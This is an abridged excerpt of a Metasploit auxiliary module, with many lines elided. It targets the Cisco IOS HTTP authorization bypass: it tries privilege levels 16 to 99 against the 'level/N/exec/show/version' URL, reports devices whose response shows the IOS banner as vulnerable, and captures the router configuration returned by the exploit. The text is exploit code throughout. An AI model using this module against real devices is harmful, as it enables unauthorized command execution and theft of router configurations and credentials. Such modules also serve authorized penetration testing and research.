...
class MetasploitModule < Msf::Auxiliary
  ...
  def run_host(_ip)
    16.upto(99) do |level|
      ...
      next unless res && res.body && res.body =~ /Cisco Internetwork Operating System Software/
      ...
      report_vuln(
        ...
        info: "Module #{fullname} successfully accessed http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR",
        refs: references,
      ...
      if res && res.body && res.body =~ /<FORM METHOD([^\>]+)\>(.*)<\/FORM>/mi
        config = Regexp.last_match(2).strip
        ...
        report_exploit(
          ...
          name: name,
          sname: ssl ? "https" : "http",
          info: "Module #{fullname} successfully captured the configuration file:\n#{config}"
        )
      else
